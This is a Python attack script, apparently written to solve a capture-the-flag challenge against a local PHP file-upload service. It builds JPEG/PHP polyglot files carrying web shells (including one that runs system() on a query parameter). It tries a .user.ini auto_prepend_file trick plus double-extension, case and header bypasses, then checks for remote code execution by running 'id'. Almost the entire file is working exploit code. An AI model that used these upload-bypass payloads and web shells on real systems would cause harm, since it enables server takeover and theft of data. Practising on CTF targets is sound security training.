import requests
import re

base_url = "http://127.0.0.1:33021"

# Create minimal valid JPEG
def create_minimal_jpeg():
    jpeg = b'\xff\xd8'
    jpeg += b'\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00'
    jpeg += b'\xff\xdb\x00C\x00\x08\x06\x06\x07\x06\x05\x08\x07\x07\x07\t\t'
    jpeg += b'\x08\x0a\x0c\x14\x0d\x0c\x0b\x0b\x0c\x19\x12\x13\x0f\x14\x1d\x1a'
    jpeg += b'\x1f\x1e\x1d\x1a\x1c\x1c $.\x28 #\x17\x1c,),.444444)\x22\x22\x22'
    jpeg += b'\xff\xc0\x00\x0b\x08\x00\x01\x00\x01\x01\x01\x11\x00'
    jpeg += b'\xff\xc4\x00\x1f\x00\x00\x01\x05\x01\x01\x01\x01\x01\x01\x00\x00\x00\x00\x00\x00\x00'
    jpeg += b'\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b'
    jpeg += b'\xff\xda\x00\x08\x01\x01\x00\x00?\x00'
    jpeg += b'\x7f\xd4\xb5\xa8\x88'
    jpeg += b'\xff\xd9'
    return jpeg

jpeg_content = create_minimal_jpeg()

# Test 1: Understand the filename handling
print("[*] TEST 1: Analyze filename handling")
test_names = [
    'test.jpg',
    'test.jpeg',
    'test.JPG',
    'test.JPEG',
    'test.jpg.jpg',
    'test.jpeg.jpg',
]
for name in test_names:
    files = {'userfile': (name, jpeg_content, 'image/jpeg')}
    r = requests.post(f"{base_url}/index.php", files=files)
    # Extract uploaded filename from response
    match = re.search(r"successfully uploaded.*?href='([^']+)'", r.text, re.I)
    if match:
        print(f"[+] {name} -> {match.group(1)}")

# Test 2: Try uploading .user.ini with .jpeg extension (case sensitive)
print("\n[*] TEST 2: Upload .user.ini.jpeg")
userini_jpeg = jpeg_content + b'\nauto_prepend_file=shell.jpg\n'
files = {'userfile': ('.user.ini.jpeg', userini_jpeg, 'image/jpeg')}
r = requests.post(f"{base_url}/index.php", files=files)
print(f"[+] Response: {r.text[:500]}")

# Check what was uploaded
match = re.search(r"href='([^']+)'", r.text)
if match:
    uploaded_name = match.group(1)
    print(f"[+] Uploaded as: {uploaded_name}")
    r2 = requests.get(f"{base_url}/{uploaded_name}")
    print(f"[+] Access: {r2.status_code}")

# Test 3: Try uploading with .php extension to see what happens
print("\n[*] TEST 3: Upload shell.php")
shell_jpeg = jpeg_content + b'<?php echo getenv("FLAG"); ?>'
files = {'userfile': ('shell.php', shell_jpeg, 'image/jpeg')}
r = requests.post(f"{base_url}/index.php", files=files)
print(f"[+] Response: {r.text[:500]}")
match = re.search(r"href='([^']+)'", r.text)
if match:
    print(f"[+] Uploaded as: {match.group(1)}")

# Test 4: Try case manipulation
print("\n[*] TEST 4: Case manipulation")
case_names = [
    'SHELL.PHP.JPG',
    'Shell.PhP.Jpg',
    'shell.PHP.jpg',
    'TEST.PhP.jpg',
]
for name in case_names:
    files = {'userfile': (name, shell_jpeg, 'image/jpeg')}
    r = requests.post(f"{base_url}/index.php", files=files)
    match = re.search(r"href='([^']+)'", r.text)
    if match:
        uploaded = match.group(1)
        print(f"[+] {name} -> {uploaded}")
        # Try to access both with and without .jpg
        r2 = requests.get(f"{base_url}/{uploaded}")
        r3 = requests.get(f"{base_url}/{uploaded.replace('.jpg', '')}")
        print(f"    [+] Access: {r2.status_code}, Without .jpg: {r3.status_code}")

# Test 5: Look for the exact filename pattern
print("\n[*] TEST 5: Check current uploaded files")
check_files = [
    'shell.jpg', 'shell.php.jpg', 'shell.php.jpeg', 'shell.php', 'shell.jpeg',
    '.user.ini.jpg', '.user.ini.jpeg', '.user.ini', '.htaccess.jpg', '.htaccess'
]
for f in check_files:
    r = requests.get(f"{base_url}/upload/{f}")
    if r.status_code == 200:
        print(f"[+] {f}: EXISTS ({len(r.content)} bytes)")
        # Check for FLAG in content
        if 'FLAG' in r.text:
            flags = re.findall(r'FLAG\{[^}]+\}', r.text)
            if flags:
                print(f"    [!!!] FLAG FOUND: {flags}")

# Test 6: Try to access shell.php.jpg as PHP
print("\n[*] TEST 6: Try to execute shell.php.jpg")
r = requests.get(f"{base_url}/upload/shell.php.jpg", params={'cmd': 'id'})
print(f"[+] shell.php.jpg?cmd=id: {r.status_code}")
print(f"[+] Response: {r.text[:300]}")

# Test 7: Check if Apache parses multiple extensions
print("\n[*] TEST 7: Apache multi-extension handling")
# Upload a file that Apache might execute as PHP
polyglot = jpeg_content + b'<?php system($_GET["c"]); ?>'
test_exts = ['test.php.jpg', 'test.php.jpeg', 'test.php.JPG', 'test.php.JPEG']
for ext in test_exts:
    files = {'userfile': (ext, polyglot, 'image/jpeg')}
    r = requests.post(f"{base_url}/index.php", files=files)
    match = re.search(r"href='([^']+)'", r.text)
    if match:
        uploaded = match.group(1)
        # Try to execute
        r2 = requests.get(f"{base_url}/{uploaded}", params={'c': 'id'})
        if 'uid=' in r2.text:
            print(f"[!!!] RCE via {ext}!")
            print(r2.text)

# Test 8: Try to trigger PHP via Accept header
print("\n[*] TEST 8: Trigger PHP via Content-Type")
r = requests.get(f"{base_url}/upload/shell.jpg", 
                 headers={'Content-Type': 'application/x-httpd-php'},
                 params={'cmd': 'id'})
print(f"[+] Content-Type hack: {r.status_code}")
if 'uid=' in r.text:
    print("[!!!] RCE!")

# Test 9: Check the exact response for shell.jpg
print("\n[*] TEST 9: Exact shell.jpg content")
r = requests.get(f"{base_url}/upload/shell.jpg")
print(f"[+] Status: {r.status_code}")
print(f"[+] Content (raw): {r.content}")

